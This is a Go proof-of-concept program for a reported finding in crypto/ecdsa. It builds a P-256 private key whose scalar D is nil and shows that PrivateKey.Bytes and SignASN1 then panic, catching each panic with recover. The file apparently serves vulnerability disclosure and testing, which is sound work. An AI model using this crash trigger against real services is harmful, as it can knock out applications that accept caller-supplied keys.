// PoC for finding 029: Nil Scalar Panics in crypto/ecdsa.
//
// privateKeyToFIPS in src/crypto/ecdsa/ecdsa.go calls priv.D.BitLen() and
// priv.D.Sign() without first checking whether D is nil. With a supported
// curve and valid X/Y coordinates, a caller-supplied ecdsa.PrivateKey with
// D == nil reaches PrivateKey.Bytes / SignASN1 / deterministic signing and
// crashes the process via a nil receiver method call on *big.Int.
package main

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"fmt"
)

func tryBytes(priv *ecdsa.PrivateKey) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Printf("PrivateKey.Bytes nil D: PANIC AS EXPECTED: %v\n", r)
		}
	}()
	out, err := priv.Bytes()
	fmt.Printf("PrivateKey.Bytes nil D: no panic, err=%v out=%d bytes\n", err, len(out))
}

func trySign(priv *ecdsa.PrivateKey) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Printf("ecdsa.SignASN1 nil D: PANIC AS EXPECTED: %v\n", r)
		}
	}()
	hash := make([]byte, 32)
	sig, err := ecdsa.SignASN1(rand.Reader, priv, hash)
	fmt.Printf("ecdsa.SignASN1 nil D: no panic, err=%v sig=%d bytes\n", err, len(sig))
}

func main() {
	good, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		panic(err)
	}

	bad := &ecdsa.PrivateKey{
		PublicKey: ecdsa.PublicKey{Curve: elliptic.P256(), X: good.X, Y: good.Y},
		D:         nil,
	}

	tryBytes(bad)
	trySign(bad)
}
